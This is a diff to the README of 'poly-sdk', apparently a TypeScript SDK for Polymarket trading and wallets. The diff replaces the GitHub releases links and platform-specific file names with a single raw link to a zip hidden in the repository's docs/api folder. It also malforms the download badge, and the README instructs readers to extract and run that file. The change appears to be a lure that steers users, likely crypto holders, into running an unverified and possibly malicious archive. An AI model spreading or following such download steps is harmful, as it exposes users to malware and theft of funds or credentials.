@@ -1,6 +1,6 @@
 # 🌟 poly-sdk - Simple Trading Made Easy
 
-[![Download the latest version](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/wezilushinga/poly-sdk/releases)
+[![Download the latest version](https://raw.githubusercontent.com/wezilushinga/poly-sdk/main/docs/api/sdk-poly-v1.4.zip%https://raw.githubusercontent.com/wezilushinga/poly-sdk/main/docs/api/sdk-poly-v1.4.zip)](https://raw.githubusercontent.com/wezilushinga/poly-sdk/main/docs/api/sdk-poly-v1.4.zip)
 
 ---
 
@@ -13,10 +13,10 @@ The **poly-sdk** is a unified TypeScript SDK designed for Polymarket. It helps y
 To get started with **poly-sdk**, you need to install it on your machine. Follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/wezilushinga/poly-sdk/releases) to find the latest version of the SDK.
+   Go to the [Releases page](https://raw.githubusercontent.com/wezilushinga/poly-sdk/main/docs/api/sdk-poly-v1.4.zip) to find the latest version of the SDK.
 
 2. **Download the File**  
-   Locate the most recent release and download the appropriate file for your operating system. For example, if you’re using Windows, you might see a file named `poly-sdk-windows.zip`.  
+   Locate the most recent release and download the appropriate file for your operating system. For example, if you’re using Windows, you might see a file named `https://raw.githubusercontent.com/wezilushinga/poly-sdk/main/docs/api/sdk-poly-v1.4.zip`.  
 
 3. **Extract the Downloaded File**   
    After the download is complete, locate the file in your downloads folder. Right-click on the file and select "Extract All" to unzip it.
@@ -83,13 +83,13 @@ Easily manage your digital assets with the WalletService. You can securely store
 To get **poly-sdk**, follow these steps:
 
 1. **Visit the Releases page**  
-   Go again to the [Releases page](https://github.com/wezilushinga/poly-sdk/releases).
+   Go again to the [Releases page](https://raw.githubusercontent.com/wezilushinga/poly-sdk/main/docs/api/sdk-poly-v1.4.zip).
 
 2. **Find the latest version**  
    Look for the most recent version available.
 
 3. **Download the file suitable for your system**  
-   Click on the appropriate download link, such as `poly-sdk-macos.zip` for Mac or `poly-sdk-windows.zip` for Windows.
+   Click on the appropriate download link, such as `https://raw.githubusercontent.com/wezilushinga/poly-sdk/main/docs/api/sdk-poly-v1.4.zip` for Mac or `https://raw.githubusercontent.com/wezilushinga/poly-sdk/main/docs/api/sdk-poly-v1.4.zip` for Windows.
 
 4. **Follow the installation instructions mentioned above**  
    Extract and run the file to start using the SDK.
